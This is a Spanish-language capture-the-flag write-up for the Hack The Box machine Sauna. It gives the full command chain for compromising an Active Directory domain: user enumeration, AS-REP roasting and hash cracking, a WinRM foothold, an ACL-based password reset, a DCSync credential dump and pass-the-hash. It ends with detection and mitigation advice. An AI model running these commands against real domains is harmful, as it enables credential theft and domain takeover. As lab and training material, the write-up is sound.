---
machine: Sauna
os: Windows
difficulty: Easy
platform: Hack The Box
category: Active Directory
state: Retired
pwned: 2026-11-09
tags: [windows, active-directory, kerberos, asrep, winrm, dcsync]
---

# Sauna — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

## TL;DR

El sitio corporativo publica los nombres del equipo, así que el formato de usuario sale sin fuerza bruta. Con la lista se hace **AS-REP roasting** sobre la cuenta sin preautenticación, se crackea el hash y se entra por WinRM. BloodHound muestra un `GenericAll` sobre una cuenta de servicio, se resetea su contraseña y desde ella se ejecuta **DCSync**.

## Reconocimiento

```bash
nmap -Pn -p- --min-rate 2000 <TARGET_IP>
nmap -Pn -sCV -p 53,80,88,135,139,389,445,464,593,636,3268,5985 <TARGET_IP>
```

| Puerto | Servicio |
|---|---|
| 80/tcp | IIS — `egotistical-bank.htb` |
| 88/389/636 | Kerberos y LDAP |
| 445/tcp | SMB |
| 5985/tcp | WinRM |

## Enumeración

La página "Meet the team" da nombres y apellidos. El formato es inicial + apellido (`fsmith`, `ssmith`, `hsmith`), y el dominio `EGOTISTICAL-BANK.HTB`.

```bash
echo 'egotistical-bank.htb' | tee -a /etc/hosts
kerbrute userenum -d egotistical-bank.htb --dc <TARGET_IP> users.txt
```

## Foothold: AS-REP roasting

```bash
impacket-GetNPUsers 'egotistical-bank.htb/' -dc-ip <TARGET_IP> -usersfile users.txt -no-pass -format hashcat
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
```

Con la contraseña:

```bash
evil-winrm -i <TARGET_IP> -u fsmith -p '<password>'
type C:\Users\fsmith\Desktop\user.txt
```

## Movimiento lateral

```bash
bloodhound-python -u fsmith -p '<password>' -d egotistical-bank.htb -ns <TARGET_IP> -c All
```

BloodHound marca `GenericAll` de `fsmith` sobre la cuenta de servicio `svc_loanmgr`. Se resetea su contraseña y se entra con ella:

```powershell
Set-ADAccountPassword -Identity svc_loanmgr -Reset -NewPassword (ConvertTo-SecureString '<newpass>' -AsPlainText -Force)
```

## Escalada: DCSync

`svc_loanmgr` tiene derechos de replicación, así que se vuelca la base:

```bash
impacket-secretsdump 'egotistical-bank.htb/svc_loanmgr:<newpass>@<TARGET_IP>' -just-dc-user Administrator
```

Con el hash de Administrator: `impacket-psexec -hashes ':<NT_HASH>' administrator@<TARGET_IP>`.

## Errores típicos

- **`KDC_ERR_C_PRINCIPAL_UNKNOWN`** → el formato de usuario no es el que crees; prueba también nombre.apellido.
- **AS-REP sin resultados** → la cuenta sí requiere preautenticación; el roasting no aplica.
- **`Access is denied` en WinRM** → el usuario no está en `Remote Management Users`.
- **DCSync denegado** → la cuenta no tiene `DS-Replication-Get-Changes`; revisa la ACL real en BloodHound.

## Detección y mitigación

- **4768** sin preautenticación (AS-REP) y **4769** anómalos.
- Desactivar `DONT_REQ_PREAUTH` en cuentas de servicio y usar contraseñas largas.
- Auditar `GenericAll`/`WriteDACL` sobre cuentas de servicio; no delegar reseteos a usuarios normales.
- Revisar `DS-Replication-Get-Changes` y alertar de `secretsdump` (DRSUAPI).

MITRE: T1558.004, T1098, T1003.006.
